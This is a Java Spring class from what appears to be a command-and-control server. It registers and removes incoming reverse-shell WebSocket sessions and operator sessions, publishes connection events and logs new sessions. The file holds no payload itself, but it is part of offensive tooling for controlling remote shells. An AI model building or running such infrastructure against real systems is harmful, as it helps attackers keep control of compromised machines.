package com.mtattab.c2cServer.service.observable;

import com.mtattab.c2cServer.model.entity.SessionLogEntity;
import com.mtattab.c2cServer.model.json.MessageEventModel;
import com.mtattab.c2cServer.model.enums.events.ActiveSessionsEvents;
import com.mtattab.c2cServer.model.json.SocketCommunicationDTOModel;
import com.mtattab.c2cServer.util.ConnectionManager;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;

import org.springframework.context.ApplicationEventPublisher;
import org.springframework.context.ApplicationEventPublisherAware;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.WebSocketSession;

import java.util.HashSet;
import java.util.Set;



@Component
@Data
@Slf4j
public class ActiveSessionsObservable  implements ApplicationEventPublisherAware {

    private ApplicationEventPublisher applicationEventPublisher;




    @Override
    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {
        this.applicationEventPublisher = applicationEventPublisher;
    }


    public void addReverseShellSession(WebSocketSession session, SessionLogEntity sessionLogEntity){
        ConnectionManager.activeReverseShellSessions.add(session);
        ConnectionManager.activeReverseShellSessionsDTO.add(new SocketCommunicationDTOModel(sessionLogEntity,session));


        this.applicationEventPublisher.publishEvent(new MessageEventModel(this, ActiveSessionsEvents.RECEIVED_NEW_CONNECTION, session));

        log.info("[+] New Session established {}",session);

    }

    public void removeReverseShellSession(WebSocketSession session){
        ConnectionManager.activeReverseShellSessions.remove(session);
        ConnectionManager.activeReverseShellSessionsDTO.removeIf(shell -> shell.getSocketId().equalsIgnoreCase(session.getId()));

        this.applicationEventPublisher.publishEvent(new MessageEventModel(this, ActiveSessionsEvents.LOST_CONNECTION, session));
        ConnectionManager.disconnectConnection(session);

        log.info("[+] Session Closed {}",session);


    }

    public void addManagerSession(WebSocketSession session){
        ConnectionManager.activeMangerSessions.add(session);
    }
    public void removeManagerSession(WebSocketSession session){
        ConnectionManager.activeMangerSessions.remove(session);
        ConnectionManager.disconnectConnection(session);


    }





}
